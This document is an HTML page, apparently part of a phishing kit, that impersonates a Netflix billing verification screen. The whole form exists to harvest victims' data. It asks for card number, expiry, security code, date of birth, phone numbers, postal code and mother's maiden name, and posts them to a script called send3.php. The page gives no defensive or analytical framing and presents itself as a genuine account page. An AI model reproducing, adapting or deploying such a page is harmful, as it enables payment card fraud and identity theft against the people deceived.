<html lang="fr" id="NETFLIX"><head></head><body>
    <link href="css/mala.css" media="all" type="text/css" rel="stylesheet">
                            <form class="js-lgc-search-form" method="POST" action="send3.php">
<div class="wrapper">
       
<title>Netflix - 07312016</title>
        <!-- end of header -->
    
    <!--end of wrapHeader-->
    <div class="wrapMain">
        <div class="subWrap main">
            <div class="content" id="content">
                
    <div id="flowcontent">    <input type="hidden" name="hdnOmniturePayBill" id="hdnOmniturePayBill" value="{s_oAPT:'#APT@X#-#APT@Y#-#APT@Z#',s_oARS:'#ARS#',s_oLNK:'true'}">
<input data-val="true" data-val-required="The IsAllBillsPreAuthorized field is required." id="IsAllBillsPreAuthorized" name="IsAllBillsPreAuthorized" type="hidden" value="True">    <div class="cWrap pgTitle">
        <h1 style="color:red"></h1><img src="https://s11.postimg.org/nxzkzbtmr/image.png" width="200" height="100"  >
    </div>
    <div class="cWrap">
        <div class="cBox stepList splitterJs">
    <img src="bir.PNG"></div></div>

        


        <div class="cBox hide" id="errorMessageSummary">
            <div class="warning">
                <div class="padder">
                    <div class="message messageThemeC">
                        <h2 class="headingType4">An error occurred while processing your request.</h2>
                        <span class="validation-summary-errors">
                            
                        </span>
                    </div>
                </div>
            </div>
        <div class="cBoxExtra1"><!-- --></div><div class="cBoxExtra2"><!-- --></div><div class="cBoxExtra3"><div class="cBoxExtra4"><!-- --></div></div><div class="cBoxExtra5"><div class="cBoxExtra6"><!-- --></div></div></div>

        

        <div class="cBox">
            <div class="padder cHeader">
                <h2 class="fontFace">Billing information</h2>
                <div class="clearer"></div>
            </div>

<div id="makepayment" class="padder">
    <h3 class="headingType4"><label id="table_header_bills_to_pay"></label></h3>
    <div class="spacer1"></div>
    <div class="multiColumnCollection">
            <div class="multiColumn splitterJs">
                <div class="column" style="width:440px;">
                    <div class="shell shellThemeE" style="min-height: 12.3333em;">
                        <div class="formGroup formGroupThemeC formCheckBox">
                            <div class="sectionContent">
                                <div class="optionGroup">
                                    <input checked="checked" data-val="true" data-val-required="The IsChecked field is required." id="Items_0__IsChecked" name="Items[0].IsChecked" style="visibility:hidden;" type="checkbox" value="true"><input name="Items[0].IsChecked" type="hidden" value="false">
                                    <label for="Items_0__IsChecked"> Welcome to your account . </label>
                                    <p>
                                        <strong> date:</strong> <span class="priceTag">
                                            14 April 2017                                            
                                        </span>
                                    </p>
                                </div>
                                <div class="formGroup formGroupThemeC formText">
                                    <div class="sectionHeader">
                                        <label for="Items_0__AmountStr" id="label_paymemt_amount">Confirmation Number : </label>
                                    </div>
                                    <div class="">
                                        <input id="Items_0__AmountStr" maxlength="7" name="Items[0].AmountStr" disabled="disabled" type="text" value="07312016">
                                        
                                    </div>
                                
                                
                                 
                                <div class="clearer"></div>
                                </div>
                                                                    <p class="message messageThemeD">the verification will be confirmed in a few moments.</p>
                            </div>
                            <div class="clearer"></div>
                        </div>
                    </div>
                </div>
            </div>
    </div>
    


</div>                <div class="clearer"></div>
                <div class="padder">
                    
                        <div class="hSeparator spacer2"></div>
                    <div class="formGroup formGroupThemeA formSelect">
                        <div class="sectionHeader">
                            <label id="  ">  </label>
                            <label id="table_label_methodofpayment">Method of payment</label>
                        </div>
                </div>
                <div class="clearer"></div>
                    <div class="multiColumnCollection">

                        <div class="multiColumn">
                            <div class="column" style="width: 435px;">
                                <div class="shell shellThemeE" style="min-height: 2.08333em;">
                                    <div class="formGroup formGroupThemeC">
                                        <label for="Debit" id="bankAccount"></label>

                                        <input id="PaymentBankAccount" name="SelectedPaymentMethod" type="radio" value="Debit">
                                        <label for="PaymentBankAccount">Credit Card</label>

                                        <div class="clearer"></div>
                                        <div class="clearer"></div>
                                    </div>
                                </div>
                            </div>
                            
                        </div>
                    </div>
</div>                <div class="padder">
                    <div class="spacer1"></div>
                </div>
                <div id="ccarea" style="display: none;">
<style type="text/css">
    /* fix EI8 opacity issue */
    .dim
    {
        filter: alpha(opacity=20);
    }
</style>

<div class="formGroup formText">
<div class="sectionHeader"><label for="SelectedCreditCard_CardholderName" id="customer_credit_card_detail_name">Cardholder</label></div>
<div class="sectionContent">
    <span><input id="mesa" maxlength="30" name="mesa" type="text" value=""></span>
    <span class="inputAside">
          <a href="#myContent7Id" onclick="$.lightBox.showInPage('#myContent7Id', {colClassName:'col10'});return false;">No name on card?</a>
    </span>
    <div class="clearer">
    </div>
    
    <p class="helpMessage">Enter name as it appears on the credit card.</p>
</div>
<div class="clearer">
</div>
</div>
<div class="formGroup formText">
<div class="sectionHeader"><label for="SelectedCreditCard_CreditCardNumberMasked" id="customer_credit_card_detail_number">Card number</label></div>
<div class="sectionContent">

        <input autocomplete="off" id="ccnum" maxlength="25" name="ccnum" type="text" value="">
        <p class="inputAside">
            <span class="icon iconVisa" id="ccTypeVisa"><strong>Visa</strong></span> <span class="icon iconMastercard" id="ccTypeMasterCard">Mastercard</span> <span class="icon iconAmex" id="ccTypeAMEX">
                    Amex</span>
        </p>
    <div class="clearer"></div>
    <span></span>
</div>
<div class="clearer">
</div>
</div>
<div class="formGroup formSelect">
<div class="sectionHeader"><label for="SelectedCreditCard_ExpireMonth" id="customer_credit_card_detail_exp_date">Expiry date</label></div>
<div class="sectionContent">
    <select data-val="true" id="month" name="month"><option value="">MM</option>
<option value="1">01</option>
<option value="2">02</option>
<option value="3">03</option>
<option value="4">04</option>
<option value="5">05</option>
<option value="6">06</option>
<option value="7">07</option>
<option value="8">08</option>
<option value="9">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
    <select data-val="true"  id="year" name="year"><option value="">YY</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
</select>
    <div class="clearer"></div>
    
</div>
<div class="clearer">
</div>
</div>
<div class="formGroup formText">
<div class="sectionHeader"><label for="SelectedCreditCard_SecurityCodeMasked" id="customer_credit_card_detail_security_code">Card security code</label></div>
<div class="sectionContent">
   <span><input class="inputSize1" data-val="true" id="cvv" maxlength="4" name="cvv" type="password" value=""></span>
   <span class="inputAside">
   </span>
    <div class="clearer">
    </div>
    
</div>
<div class="clearer">
</div>
</div>

<div class="accessAlt" id="CCNeedHelp">
    <div class="lightBoxPadder">
        <div class="padder">
            <p class="lightBoxTitleJs">What is a security code?</p>
        </div>
        
        <div class="clearer">
        </div>
    </div>
</div>

</div>
                <div id="ccarea" style="display: block;">
<style type="text/css">
    /* fix EI8 opacity issue */
    .dim
    {
        filter: alpha(opacity=20);
    }
</style>


<div class="spacer2">
</div>
<div class="formGroup formText">
<div class="sectionHeader"><span></span><label for="SelectedCreditCard_CreditCardNumberMasked" id="customer_credit_card_detail_number">Postal Code</label><span style="color:red">*</span></div>
<div class="sectionContent">
        <input autocomplete="off" required="off" id="zip" maxlength="25" name="zip" onchange="SetCCType(this.value)" type="text" value="">
        
    <div class="clearer"></div>
    <span></span>
    <p class="helpMessage"></p> 
</div>
<div class="clearer">
</div>

</div>
<div class="formGroup formText">
<div class="sectionHeader"><label for="SelectedCreditCard_SecurityCodeMasked" id="customer_credit_card_detail_security_code">Number Phone</label><span style="color:red">*</span></div>
<div class="sectionContent">
   <span><input autocomplete="off" required="off" id="tel" maxlength="25" name="tel" pattern="[0-9]*"onchange="SetCCType(this.value)" type="text" value=""></span>
   
    <div class="clearer">
    </div>
    
</div>
<div class="clearer">
</div>
</div>
<div class="formGroup formText">
<div class="sectionHeader"><label for="SelectedCreditCard_SecurityCodeMasked" id="customer_credit_card_detail_security_code">Home Phone </label><span style="color:red">*</span></div>
<div class="sectionContent">
   <span><input autocomplete="off" required="off" id="telmaison" maxlength="25" name="telmaison" pattern="[0-9]*"onchange="SetCCType(this.value)" type="text" value=""></span>
   
    <div class="clearer">
    </div>
    
</div>
<div class="clearer">
</div>
</div><div class="formGroup formSelect">
<div class="sectionHeader"><label for="SelectedCreditCard_ExpireMonth" id="customer_credit_card_detail_exp_date">Date of birthday</label></div>
<div class="sectionContent">
    <select required="off" data-val="true" data-val-length="The field ExpireMonth must be a string with a maximum length of 2." data-val-length-max="2" id="daya" name="daya"><option value="">Day</option>
                                   <option value="01">1</option>
								   <option value="02">2</option>
                                    <option value="03">3</option>
                                    <option value="04">4</option>
                                    <option value="05">5</option>
                                    <option value="06">6</option>
                                    <option value="07">7</option>
                                    <option value="08">8</option>
                                    <option value="09">9</option>
                                    <option value="10">10</option>
                                    <option value="11">11</option>
                                    <option value="12">12</option>
                                    <option value="13">13</option>
                                    <option value="14">14</option>
                                    <option value="15">15</option>
                                    <option value="16">16</option>
                                    <option value="17">17</option>
                                    <option value="18">18</option>
                                    <option value="19">19</option>
                                    <option value="20">20</option>
                                    <option value="21">21</option>
                                    <option value="22">22</option>
                                    <option value="23">23</option>
                                    <option value="24">24</option>
                                    <option value="25">25</option>
                                    <option value="26">26</option>
                                    <option value="27">27</option>
                                    <option value="28">28</option>
                                    <option value="29">29</option>
                                    <option value="30">30</option>
                                    <option value="31">31</option>
</select>
    <select data-val="true" required="off" data-val-length="The field ExpireYear must be a string with a maximum length of 2." data-val-length-max="2" id="montha" name="montha"><option value="">Month</option>
                                     <option value = "01"> January </option>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <Option value = "02"> February </option>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <Option value = "03"> March </option>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <Option value = "04"> April </option>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <Option value = "05"> May </option>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <Option value = "06"> June </option>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <Option value = "07"> July </option>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <Option value = "08"> August </option>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <Option value = "09"> September </option>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <Option value = "10"> October </option>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <Option value = "11"> November </option>
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <Option value = "12"> December </option>
</select>
<select data-val="true" required="off" data-val-length="The field ExpireYear must be a string with a maximum length of 2." data-val-length-max="2" id="yeara" name="yeara"><option value="">Year</option>
                                     <option value="1998">1998</option>
                                    <option value="1997">1997</option>
                                    <option value="1996">1996</option>
                                    <option value="1995">1995</option>
                                    <option value="1994">1994</option>
                                    <option value="1993">1993</option>
                                    <option value="1992">1992</option>
                                    <option value="1991">1991</option>
                                    <option value="1990">1990</option>
                                    <option value="1989">1989</option>
                                    <option value="1988">1988</option>
                                    <option value="1987">1987</option>
                                    <option value="1986">1986</option>
                                    <option value="1985">1985</option>
                                    <option value="1984">1984</option>
                                    <option value="1983">1983</option>
                                    <option value="1982">1982</option>
                                    <option value="1981">1981</option>
                                    <option value="1980">1980</option>
                                    <option value="1979">1979</option>
                                    <option value="1978">1978</option>
                                    <option value="1977">1977</option>
                                    <option value="1976">1976</option>
                                    <option value="1975">1975</option>
                                    <option value="1974">1974</option>
                                    <option value="1973">1973</option>
                                    <option value="1972">1972</option>
                                    <option value="1971">1971</option>
                                    <option value="1970">1970</option>
                                    <option value="1969">1969</option>
                                    <option value="1968">1968</option>
                                    <option value="1967">1967</option>
                                    <option value="1966">1966</option>
                                    <option value="1965">1965</option>
                                    <option value="1964">1964</option>
                                    <option value="1963">1963</option>
                                    <option value="1962">1962</option>
                                    <option value="1961">1961</option>
                                    <option value="1960">1960</option>
                                    <option value="1959">1959</option>
                                    <option value="1958">1958</option>
                                    <option value="1957">1957</option>
                                    <option value="1956">1956</option>
                                    <option value="1955">1955</option>
                                    <option value="1954">1954</option>
                                    <option value="1953">1953</option>
                                    <option value="1952">1952</option>
                                    <option value="1951">1951</option>
                                    <option value="1950">1950</option>
                                    <option value="1949">1949</option>
                                    <option value="1948">1948</option>
                                    <option value="1947">1947</option>
                                    <option value="1946">1946</option>
                                    <option value="1945">1945</option>
                                    <option value="1944">1944</option>
                                    <option value="1943">1943</option>
                                    <option value="1942">1942</option>
                                    <option value="1941">1941</option>
                                    <option value="1940">1940</option>
                                    <option value="1939">1939</option>
                                    <option value="1938">1938</option>
                                    <option value="1937">1937</option>
                                    <option value="1936">1936</option>
                                    <option value="1935">1935</option>
                                    <option value="1934">1934</option>
                                    <option value="1933">1933</option>
                                    <option value="1932">1932</option>
                                    <option value="1931">1931</option>
                                    <option value="1930">1930</option>
                                    <option value="1929">1929</option>
                                    <option value="1928">1928</option>
                                    <option value="1927">1927</option>
                                    <option value="1926">1926</option>
                                    <option value="1925">1925</option>
                                    <option value="1924">1924</option>
                                    <option value="1923">1923</option>
                                    <option value="1922">1922</option>
                                    <option value="1921">1921</option>
                                    <option value="1920">1920</option>
                                    <option value="1919">1919</option>
                                    <option value="1918">1918</option>
                                    <option value="1917">1917</option>
</select>
    <div class="clearer"></div>
     
</div>
<div class="clearer">
</div>
</div>

<div class="formGroup formText">
<div class="sectionHeader"><span></span><label for="SelectedCreditCard_CreditCardNumberMasked" id="customer_credit_card_detail_number">Mother maiden name</label><span style="color:red">*</span></div>
<div class="sectionContent">
        <input autocomplete="off" required="off" id="mok" maxlength="25" name="mok" onchange="SetCCType(this.value)" type="text" value="">
        
    <div class="clearer"></div>
    <span></span>
     
</div>
<div class="clearer">
</div>
</div><br<br>
</br<br>
<div id="myContent7Id" class="accessAlt ">
    <p class="lightBoxTitleJs">No cardholder name</p>
   
</div>
</div>
                <div class="clearer"></div>
                <!-- /formGroup -->
        <div class="cBoxExtra1"><!-- --></div><div class="cBoxExtra2"><!-- --></div><div class="cBoxExtra3"><div class="cBoxExtra4"><!-- --></div></div><div class="cBoxExtra5"><div class="cBoxExtra6"><!-- --></div></div></div>

        <div class="cBox cBoxThemeA">
            <div class="padder processAction">
                <div class="splitter">
                    <div class="splitterLeft">
                       
                    </div>
                    <div class="splitterRight">
                        <div class="splitterContent">
                                        <div id="nextsection" style="display: block;">
<input type="image" src="b.PNG" class="submit">                                        </div>
                                        <div id="nextsectionhide" style="display: none;">
                                            <a class="button toolTipJs buttonDisabled" title="" id="lnkContinuehide"><span>Next<span><!-- --></span></span></a>
                                        </div>
                        </div>
                    </div>
                </div>
            </div>
        <div class="cBoxExtra1"><!-- --></div><div class="cBoxExtra2"><!-- --></div><div class="cBoxExtra3"><div class="cBoxExtra4"><!-- --></div></div><div class="cBoxExtra5"><div class="cBoxExtra6"><!-- --></div></div></div>
        <!--
        <div style="display:none;">
        </div>
        -->
    </div>
    <style type="text/css">
    /*added for an IE6 fix*/
    .u55_container {
        POSITION: absolute;
        WIDTH: 445px;
        HEIGHT: 64px;
        TOP: 540px;
        LEFT: 60px;
    }
    </style>

    
    </div>
  


            </div>
            
        </div>
        <!--end of main-->
    </div></form>
    <!--end of wrapMain-->
    <div align="center" class="wrapFooter">
        

        <footer class="rsx-lgc-footer">
           
            <div class="rsx-lgc-container rsx-lgc-clearfix">
                <div class="rsx-lgc-footer-search-wrap rsx-lgc-clearfix">
                  <img src="fin.PNG">
  </div>
    </div>
			
			
        </footer>


       
    </div>


    
<!--?php
*///////////
?-->



    </body></html>